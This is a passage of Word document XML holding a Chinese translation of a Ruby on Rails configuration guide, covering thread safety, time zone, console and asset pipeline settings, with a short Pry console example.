          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>allow_concurrency</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>dependency_loading</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>preload_frameworks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来让应用程序实现线程安全。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78AF1E7A"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线程安全操作与一般开发模式下的 Rails 不兼容的。特别要注意的是当你调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.threadsafe</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候，自动依赖加载和类重新加载都会被自动取消。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713120E2" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="139"/>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config.time_zone</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置应用程序 Active Record 可用的默认时区。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C773F8" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="140"/>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config.whiny_nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开启或取消当一些方法被 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用且 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 没有这些方法的时候抛出警告。在开发和测试环境都默认为 true.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B899ED" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14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config.console</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你设置当你运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails console</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候用作控制台的类。 它最好在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>console</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块下运行:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="34761A24" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2EF61914"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console do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="322CD109"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 this block is called only when running console,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C5C05A8"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 so we can safely require pry here</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7151F17E"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require "pry"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FAA6B87"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config.console = Pry</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77EC0483"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="31D596FE"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3.2 配置资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0E65CA"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Rails 3.1, 默认使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sprockets</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem 来管理资源。这个 gem 可以合并并压缩资源以降低服务器负载。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4563D637" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14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config.assets.enabled</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是一个标记，这个标记控制是否使用 asset pipeline。 这在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里被明确的初始化了.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221DE209" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14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config.assets.compress</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 标记是否压缩已经编译好的资源。这在</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/production.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里明确的设置为 true.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7535E1" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="144"/>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config.assets.css_compressor</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 定义要使用的 CSS 压缩器。默认被设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sass-rails</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。目前唯一可选的值是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:yui</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 这会使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>yui-compressor</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA0E4EE" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14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config.assets.js_compressor</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 定义要使用的 JavaScript 压缩器。很可能是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:closure</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:uglifier</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:yui</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，分别需要使用到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>closure-compiler</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>uglifier</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>yui-compressor</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7B89C0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14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config.assets.paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包含了所有用来搜寻资源的路径。 添加到这个配置选项里的路径都会被用于搜索资源.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07607E5E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14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config.assets.precompile</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你指定其它（</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.css</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.js</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">以外的）资源，这些资源会在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake assets:precompile</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 执行时被预编译.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDC9A1E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="148"/>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config.assets.prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定资源目录的前缀，默认是</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79112CB0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="149"/>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config.assets.digest</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使资源的名字使用 MD5 指纹。在</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>production.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">默认设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EC5A32" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="150"/>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config.assets.debug</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不合并压缩资源。在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>development.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里默认不设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604CE630" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15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config.assets.manifest</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
